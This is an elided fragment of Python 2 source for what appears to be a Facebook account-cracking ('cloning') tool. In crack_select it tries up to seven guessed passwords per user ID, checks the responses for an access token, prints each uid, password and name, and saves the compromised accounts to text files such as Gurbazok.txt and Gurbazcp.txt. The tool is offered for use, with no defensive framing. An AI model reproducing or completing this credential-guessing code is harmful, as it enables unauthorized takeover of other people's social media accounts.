...
def main():
    ...
    os.system('xdg-open https://www.facebook.com/sagir.nawaz.3')
...
def crack_select():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92m[GURBAZ OK] ' + uid + ' | ' + pass1 + ' | ' + name

                ok = open('Gurbazok.txt', 'a')
                ...
                print '\x1b[1;93m[GURBAZ] ' + uid + ' | ' + pass1 + ' | ' + name

                cp = open('Gurbazcp.txt', 'a')
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;92m[GURBAZ OK] ' + uid + ' | ' + pass2 + ' | ' + name
                    ...
                    print '\x1b[1;93m[GURBAZ] ' + uid + ' | ' + pass2 + ' | ' + name
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;92m[GURBAZ OK] ' + uid + ' | ' + pass3 + ' | ' + name
                        ...
                        print '\x1b[1;93m[GURBAZ] ' + uid + ' | ' + pass3 + ' | ' + name
                        ...
                        if 'access_token' in q:
                            ...
                            print '\x1b[1;92m[GURBAZ OK] ' + uid + ' | ' + pass4 + ' | ' + name
                            ...
                            print '\x1b[1;93m[GURBAZ OK] ' + uid + ' | ' + pass4 + ' | ' + name
                            ...
                            if 'access_token' in q:
                                ...
                                print '\x1b[1;92m[GURBAZOK] ' + uid + ' | ' + pass5 + ' | ' + name
                                ...
                                print '\x1b[1;93m[GURBAZ OK] ' + uid + ' | ' + pass5 + ' | ' + name
                                ...
                                if 'access_token' in q:
                                    ...
                                    print '\x1b[1;92m[GURBAZ OK] ' + uid + ' | ' + pass6 + ' | ' + name
                                    ...
                                    print '\x1b[1;93m[GURBAZ OK] ' + uid + ' | ' + pass6 + ' | ' + name

                                    cp = open('Gurbazok.txt', 'a')
                                    ...
                                    if 'access_token' in q:
                                        ...
                                        print '\x1b[1;92m[GURBAZ OK] ' + uid + ' | ' + pass7 + ' | ' + name
                                        ...
                                        print '\x1b[1;93m[GURBAZ] ' + uid + ' | ' + pass7 + ' | ' + name
    ...
    print ' \x1b[1;92mNote: Clone Account Saved Sdcard Folder: Gurbazcp.txt'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92m[GURBAZOK] ' + uid + ' | ' + pass1 + ' | ' + name
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;92m[GURBAZOK] ' + uid + ' | ' + pass2 + ' | ' + name
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;92m[GURBAZ] ' + uid + ' | ' + pass3 + ' | ' + name
                        ...
                        if 'access_token' in q:
                            ...
                            print '\x1b[1;93m[GURBAZ] ' + uid + ' | ' + pass4 + ' | ' + name

                            cp = open('Gurbazncp.txt', 'a')
                            ...
                            if 'access_token' in q:
                                ...
                                print '\x1b[1;93m[GURBAZ] ' + uid + ' | ' + pass5 + ' | ' + name
                                ...
                                if 'access_token' in q:
                                    ...
                                    print '\x1b[1;92m[GURBAZOK] ' + uid + ' | ' + pass6 + ' | ' + name
                                    ...
                                    print '\x1b[1;93m[GURBAZ] ' + uid + ' | ' + pass6 + ' | ' + name
                                    ...
                                    if 'access_token' in q:
                                        ...
                                        print '\x1b[1;92m[GURBAZOK] ' + uid + ' | ' + pass7 + ' | ' + name
